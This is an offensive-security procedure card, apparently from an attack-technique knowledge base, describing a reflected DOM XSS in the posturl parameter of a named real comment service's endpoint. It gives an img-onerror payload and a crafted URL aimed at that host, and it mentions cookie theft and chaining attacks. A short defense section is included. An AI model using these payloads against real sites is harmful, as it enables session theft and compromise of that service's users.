---
id: proc-1043804-posturl-xss
tags:
  - xss
  - dom-xss
  - posturl
  - javascript-injection
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
commands:
  - '[[commands/execute-form-submission-js]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:55:06.596Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Inject-XSS-Payload-into-Posturl-Parameter

## Summary

This procedure targets a similar reflected DOM-based XSS in the posturl parameter of the same endpoint, allowing JavaScript execution after an initial fix for posttitle, demonstrating persistence or incomplete patching.

## Description

Following the posttitle fix, the posturl parameter remains vulnerable due to lack of sanitization, reflecting user input into the DOM. Payloads like "><img src=x onerror=alert(1)> injected into posturl execute on page load, enabling the same impacts: cookie theft, redirection, defacement, or unauthorized actions. Applicable to the web environment with PHP backend.

## Requirements

1. Web browser access
2. Endpoint parameters (acct, postid, posttitle)
3. Awareness of prior fix to target alternative vector

## Defense

Defensive measures and detection strategies:

- Apply uniform input validation across all parameters
- Use HTML entity encoding for URLs in DOM
- Log and alert on suspicious parameter lengths or characters

## Objectives

1. Exploit unpatched parameter for JS execution
2. Confirm alert trigger
3. Chain with other attacks for escalation

## Instructions

### Step 1: Prepare URL with Posturl Payload

**Context**: Embed the payload in posturl, keeping other parameters benign.

Crafted URL:

```url
https://www.intensedebate.com/js/getCommentLink.php?acct=example&postid=123&posturl=%3Cimg%20src=x%20onerror=alert(1)%3E&posttitle=safe
```

> URL encoding ensures the payload passes through without breaking the query string.

### Step 2: Trigger in Browser

**Context**: Load to observe execution.

Open in [[tools/Firefox]].

**Expected Output**: Alert with '1', indicating successful DOM insertion and execution.

> Validate by checking network requests or console for errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Initial Access]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/execute-form-submission-js]]

## Tools Used

- [[tools/Firefox]]

## Tags

- xss
- dom-xss
- injection
